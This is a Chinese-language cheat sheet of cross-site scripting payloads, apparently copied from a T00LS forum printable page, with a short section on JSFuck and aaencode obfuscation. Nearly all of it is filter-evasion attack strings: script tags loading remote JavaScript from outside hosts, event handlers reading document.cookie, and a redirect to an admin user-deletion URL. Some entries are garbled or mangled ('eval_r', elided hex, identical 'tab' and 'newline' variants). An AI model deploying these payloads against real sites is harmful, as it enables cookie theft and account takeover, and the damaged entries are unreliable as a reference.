# Cross-Site Scripting

## 1、常见XSS

```text
·普通的XSS JavaScript注入：
<SCRIPT SRC=http://xi.baidu.com/XSS/xss.js></SCRIPT>

·IMG标签XSS使用JavaScript命令：
<SCRIPT SRC=http://xi.baidu.com/XSS/xss.js></SCRIPT>

·IMG标签无分号无引号：
<IMG SRC=javascript:alert('XSS')>

·IMG标签大小写不敏感：
<IMG SRC=JaVaScRiPt:alert('XSS')>

·HTML编码（必须有分号）：
<IMG SRC=javascript:alert("XSS")>

·修正缺陷IMG标签：
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

·formCharCode标签（计算器）：
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

·十六进制编码：
<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>

·嵌入式标签，将JavaScript分开：
<IMG SRC="jav ascript:alert('XSS');">

·嵌入式编码标签，将JavaScript分开：
<IMG SRC="jav ascript:alert('XSS');">

·嵌入式换行符：
<IMG SRC="jav ascript:alert('XSS');">

·嵌入式回车：
<IMG SRC="jav ascript:alert('XSS');">

·嵌入式多行注入JavaScript，这是XSS极端的例子：
<IMG SRC="javascript:alert('XSS')">

·解决限制字符（要求同页面）：
<script>z='document.'</script>
<script>z=z+'write("'</script>
<script>z=z+'<script'</script>
<script>z=z+' src=ht'</script>
<script>z=z+'tp://ww'</script>
<script>z=z+'w.shell'</script>
<script>z=z+'.net/1.'</script>
<script>z=z+'js></sc'</script>
<script>z=z+'ript>")'</script>
<script>eval_r(z)</script>

·Spaces和meta前的IMG标签：
<IMG SRC=" javascript:alert('XSS');">

·Non-alpha-non-digit XSS：
<SCRIPT/XSS SRC="http://3w.org/XSS/xss.js"></SCRIPT>

·Non-alpha-non-digit XSS to 2：
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

·Non-alpha-non-digit XSS to 3：
<SCRIPT/SRC="http://3w.org/XSS/xss.js"></SCRIPT>

·双开括号：
<<SCRIPT>alert("XSS");//<</SCRIPT>

·无结束脚本标记（仅火狐等浏览器）：
<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>

·无结束脚本标记2：
<SCRIPT SRC=//3w.org/XSS/xss.js>

·半开的HTML/JavaScript XSS：
<IMG SRC="javascript:alert('XSS')"

·双开角括号：
<iframe src=http://3w.org/XSS.html <

·换码过滤的JavaScript：
\";alert('XSS');//

·结束Title标签：
</TITLE><SCRIPT>alert("XSS");</SCRIPT>

·Input Image：
<INPUT SRC="javascript:alert('XSS');">

·BODY Image：
<BODY BACKGROUND="javascript:alert('XSS')">

·BODY标签：
<BODY('XSS')>

·IMG Dynsrc：
<IMG DYNSRC="javascript:alert('XSS')">

·IMG Lowsrc：
<IMG LOWSRC="javascript:alert('XSS')">

·BGSOUND：
<BGSOUND SRC="javascript:alert('XSS');">

·STYLE sheet：
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

·远程样式表：
<LINK REL="stylesheet" HREF="http://3w.org/xss.css">

·List-style-image（列表式）：
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS

·IMG VBscript：
<IMG SRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS

·META链接url：
<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert('XSS');">

·Iframe：
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

·Frame：
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>12-7-1 T00LS - Powered by Discuz! Board
https://www.t00ls.net/viewthread.php?action=printable&tid=15267 3/6

·Table：
<TABLE BACKGROUND="javascript:alert('XSS')">

·TD：
<TABLE><TD BACKGROUND="javascript:alert('XSS')">

·DIV background-image：
<DIV STYLE="background-image: url(javascript:alert('XSS'))">

·DIV expression：
<DIV STYLE="width: expression_r(alert('XSS'));">

·STYLE属性分拆表达：
<IMG STYLE="xss:expression_r(alert('XSS'))">

·匿名STYLE（组成：开角号和一个字母开头）：
<XSS STYLE="xss:expression_r(alert('XSS'))">

·STYLE background-image：
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

·STYLE background：
<STYLE><STYLE>
type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

·使用BASE标签：
<BASE HREF="javascript:alert('XSS');//">

·IMG嵌入式命令，可执行任意命令：
<IMG SRC="http://www.XXX.com/a.php?a=b">

·IMG嵌入式命令（a.jpg在同服务器）：
Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser

·绕符号过滤：
<SCRIPT a=">" SRC="http://3w.org/xss.js"></SCRIPT>

·URL绕行：
<A HREF="http://127.0.0.1/">XSS</A>

·URL编码：
<A HREF="http://3w.org">XSS</A>

·IP十进制：
<A HREF="http://3232235521″>XSS</A>

·IP十六进制：
<A HREF="http://0xc0.0xa8.0×00.0×01″>XSS</A>

·IP八进制：
<A HREF="http://0300.0250.0000.0001″>XSS</A>

·混合编码：
<A HREF="htt p://66.000146.0×7.147/"">XSS</A>

·节省[http:]：
<A HREF="//www.google.com/">XSS</A>

·节省[www]：
<A HREF="http://google.com/">XSS</A>

·JavaScript链接：
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
常见XSS攻击载荷：
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))"><INPUT TYPE="BUTTON" action="alert('XSS')"/>"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123
</h1>"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></
IFRAME>123</h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME
>"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></
IFRAME>123</h1>
```

## 2、特殊XSS

### 1.Jsfuck 

Jsfuck可以针对常见的js函数、语法进行编码转换： 

```text
False       =>  ![]
True        =>  !![
]Undefined    =>  [][[]]
Nan         =>  +[![]]
0           =>  +[]
1           =>  +!+[]
2           =>  !+[]+!+[]
10          =>  [+!+[]]+[+[]]
Array       =>  []
Number      =>  +[]
String      =>  []+[]
Boolean     =>  ![]
Function    =>  []["filter"]
Eval        =>  []["filter"]["constructor"]( code )()
Window      =>  []["filter"]["constructor"]("return this")()
```

### 2.Aaencode 

js加密工具aaencode把js转为文字表情符号。

